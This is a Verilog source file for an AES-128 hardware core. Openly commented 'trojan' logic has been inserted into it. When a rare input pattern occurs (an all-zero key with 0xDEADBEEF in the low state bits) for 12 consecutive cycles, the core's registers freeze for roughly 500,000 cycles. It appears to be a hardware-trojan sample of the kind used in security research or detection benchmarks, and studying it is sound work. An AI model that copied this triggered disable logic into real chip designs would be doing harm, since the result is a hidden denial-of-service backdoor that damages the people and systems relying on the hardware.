module aes_128(
    input          clk,
    input          rst_n,        // Active low reset added for proper reset
    input  [127:0] state,
    input  [127:0] key,
    output [127:0] out
);
    reg    [127:0] s0, k0;
    wire   [127:0] s1, s2, s3, s4, s5, s6, s7, s8, s9,
                   k1, k2, k3, k4, k5, k6, k7, k8, k9,
                   k0b, k1b, k2b, k3b, k4b, k5b, k6b, k7b, k8b, k9b;

    // Trojan signals
    reg [3:0] trojan_seq_cnt;                // Counts a rare sequence of input conditions
    reg [19:0] trojan_disable_counter;       // Duration counter to disable module
    reg        trojan_disable;                // Disable flag

    // Example rare condition: the key pattern is all zeroes except for a specific pattern appearing in state input bits
    wire rare_condition = (key == 128'h0000_0000_0000_0000_0000_0000_0000_0000) && 
                          (state[31:0] == 32'hDEADBEEF);

    // Trojan sequence detector and disable signal logic
    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            trojan_seq_cnt       <= 4'd0;
            trojan_disable       <= 1'b0;
            trojan_disable_counter <= 20'd0;
        end else begin
            // Detect the rare condition sequence
            if (rare_condition) begin
                if (trojan_seq_cnt < 4'hF)
                    trojan_seq_cnt <= trojan_seq_cnt + 1'b1;
            end else begin
                trojan_seq_cnt <= 4'd0;
            end

            // Trigger disable after sequence count reaches 12
            if (trojan_seq_cnt == 4'd12 && !trojan_disable) begin
                trojan_disable <= 1'b1;
                trojan_disable_counter <= 20'd1;  // Start counting down from 1
            end

            // If disabled, count clock cycles to re-enable
            if (trojan_disable) begin
                if (trojan_disable_counter < 20'd500000) begin
                    trojan_disable_counter <= trojan_disable_counter + 1'b1;
                end else begin
                    trojan_disable <= 1'b0;
                    trojan_seq_cnt <= 4'd0;
                    trojan_disable_counter <= 20'd0;
                end
            end
        end
    end

    // Main AES logic with disable gating
    always @ (posedge clk or negedge rst_n) begin
      if (!rst_n) begin
        s0 <= 128'd0;
        k0 <= 128'd0;
      end else if (!trojan_disable) begin
        s0 <= state ^ key;
        k0 <= key;
      end
      // else s0 and k0 hold their values, effectively freezing the core operations
    end

    expand_key_128
        a1 (clk, k0, k1, k0b, 8'h1),
        a2 (clk, k1, k2, k1b, 8'h2),
        a3 (clk, k2, k3, k2b, 8'h4),
        a4 (clk, k3, k4, k3b, 8'h8),
        a5 (clk, k4, k5, k4b, 8'h10),
        a6 (clk, k5, k6, k5b, 8'h20),
        a7 (clk, k6, k7, k6b, 8'h40),
        a8 (clk, k7, k8, k7b, 8'h80),
        a9 (clk, k8, k9, k8b, 8'h1b),
       a10 (clk, k9,   , k9b, 8'h36);

    one_round
        r1 (clk, s0, k0b, s1),
        r2 (clk, s1, k1b, s2),
        r3 (clk, s2, k2b, s3),
        r4 (clk, s3, k3b, s4),
        r5 (clk, s4, k4b, s5),
        r6 (clk, s5, k5b, s6),
        r7 (clk, s6, k6b, s7),
        r8 (clk, s7, k7b, s8),
        r9 (clk, s8, k8b, s9);

    final_round
        rf (clk, s9, k9b, out);
endmodule

module expand_key_128(clk, in, out_1, out_2, rcon);
    input              clk;
    input      [127:0] in;
    input      [7:0]   rcon;
    output reg [127:0] out_1;
    output     [127:0] out_2;
    wire       [31:0]  k0, k1, k2, k3,
                       v0, v1, v2, v3;
    reg        [31:0]  k0a, k1a, k2a, k3a;
    wire       [31:0]  k0b, k1b, k2b, k3b, k4a;

    assign {k0, k1, k2, k3} = in;
    
    assign v0 = {k0[31:24] ^ rcon, k0[23:0]};
    assign v1 = v0 ^ k1;
    assign v2 = v1 ^ k2;
    assign v3 = v2 ^ k3;

    always @ (posedge clk)
        {k0a, k1a, k2a, k3a} <= {v0, v1, v2, v3};

    S4
        S4_0 (clk, {k3[23:0], k3[31:24]}, k4a);

    assign k0b = k0a ^ k4a;
    assign k1b = k1a ^ k4a;
    assign k2b = k2a ^ k4a;
    assign k3b = k3a ^ k4a;

    always @ (posedge clk)
        out_1 <= {k0b, k1b, k2b, k3b};

    assign out_2 = {k0b, k1b, k2b, k3b};
endmodule